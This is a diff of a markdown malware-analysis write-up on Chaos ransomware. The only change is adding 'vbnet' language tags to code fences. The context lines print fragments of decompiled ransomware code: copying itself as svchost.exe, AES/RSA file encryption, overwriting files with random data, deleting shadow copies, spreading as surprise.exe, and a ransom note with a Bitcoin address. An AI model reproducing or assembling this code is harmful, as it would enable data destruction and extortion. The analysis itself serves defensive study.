@@ -23,7 +23,7 @@ Firstly, the ransomware.exe process (PID 2980) self-restarts using svchost.exe, 
 
 It copy the current executable to a specified location and attempt to run it with administrative privileges. 
 
-```
+```vbnet
 Private Shared processName As String = "svchost.exe"
 
 Private Shared Sub copyResistForAdmin(processName As String)
@@ -105,7 +105,7 @@ We will now study the code
 
 ### The Entry Point
 
-```
+```vbnet
 Private Shared processName As String = "svchost.exe"
 
 Private Shared Sub Main(args As String())
@@ -150,7 +150,7 @@ We will try to detail each of the points.
 
 ### AlreadyRunning
 
-```
+```vbnet
 Private Shared Function AlreadyRunning() As Boolean
 	Dim processes As Process() = Process.GetProcesses()
 	Dim currentProcess As Process = Process.GetCurrentProcess()
@@ -190,7 +190,7 @@ In summary, this function is used to check if another instance of the applicatio
 
 ### sleepOutOfTempFolder
 
-```
+```vbnet
 Private Shared Sub sleepOutOfTempFolder()
 	Dim directoryName As String = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location)
 	Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
@@ -217,7 +217,7 @@ In summary, the `sleepOutOfTempFolder` subroutine causes the program to pause fo
 
 ### copyRoaming
 
-```
+```vbnet
 Private Shared processName As String = "svchost.exe"
 
 Private Shared Sub copyRoaming(processName As String)
@@ -281,7 +281,7 @@ In summary, this subroutine attempts to copy the current executable to the user'
 
 Many points in this section.
 
-```
+```vbnet
 Private Shared Sub lookForDirectories()
 	For Each driveInfo As DriveInfo In DriveInfo.GetDrives()
 		If driveInfo.ToString() <> "C:\" Then
@@ -327,7 +327,7 @@ It will scan specific directories and iterates through all available drives on a
 
 ### encryptDirectory
 
-```
+```vbnet
 Private Shared Sub encryptDirectory(location As String)
 	Try
 		Dim files As String() = Directory.GetFiles(location)
@@ -426,7 +426,7 @@ This code performs different actions on files based on their size:
 
 ### Small Files Encrypting Process
 
-```
+```vbnet
 Public Shared Sub EncryptFile(file As String)
 	Dim array As Byte() = File.ReadAllBytes(file)
 	Dim text As String = Program.CreatePassword(20)
@@ -530,7 +530,7 @@ This code contains several methods that work together to encrypt a file. Here's 
 This code combines AES encryption for the file's data and RSA encryption for the AES key.
 
 ### Medium-Sized Files Encrypting Process
-```
+```vbnet
 Dim string2 As String = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4))
 File.WriteAllText(files(i), Program.randomEncode(string2))
 File.Move(files(i), files(i) + "." + Program.RandomStringForExtension(4))
@@ -596,7 +596,7 @@ This code appears to be part of a file manipulation process, potentially for obf
 
 ### Very Large Files Encrypting Process
 
-```
+```vbnet
 Dim random As Random = New Random()
 Dim num As Integer = random.[Next](200000000, 300000000)
 Dim [string] As String = Encoding.UTF8.GetString(Program.random_bytes(num))
@@ -654,7 +654,7 @@ Overall, this modification shifts the focus of the file manipulation from alteri
 
 #### System Alteration
 
-```
+```vbnet
 If Program.checkAdminPrivilage Then
 		If Program.checkdeleteShadowCopies Then
 		Program.deleteShadowCopies()
@@ -697,7 +697,7 @@ This code is used for disabling or removing key backup and recovery features on 
 
 ### spreadName
 
-```
+```vbnet
 Private Shared checkSpread As Boolean = True
 Private Shared spreadName As String = "surprise.exe"
 
@@ -729,7 +729,7 @@ This part of code is designed to self-replicate (spread) across different drives
 
 ### addAndOpenNote (Ransomware Note)
 
-```
+```vbnet
 Private Shared droppedMessageTextbox As String = "read_it.txt"
 
 Private Shared messages As String() = New String() { "----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:", "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", "" }
@@ -749,7 +749,7 @@ This code creates a "read_it.txt" file with a ransom message and then opens it. 
 
 ### validExtensions
 
-```
+```vbnet
 Private Shared validExtensions As String() = New String() {
     ".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls",
     ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy",
@@ -784,7 +784,7 @@ List of file extensions that will be affected by the ransomware
 
 ### SetWallpaper
 
-```
+```vbnet
 Public Shared Sub SetWallpaper(base64 As String)
 	If base64 <> "" Then
 		Try
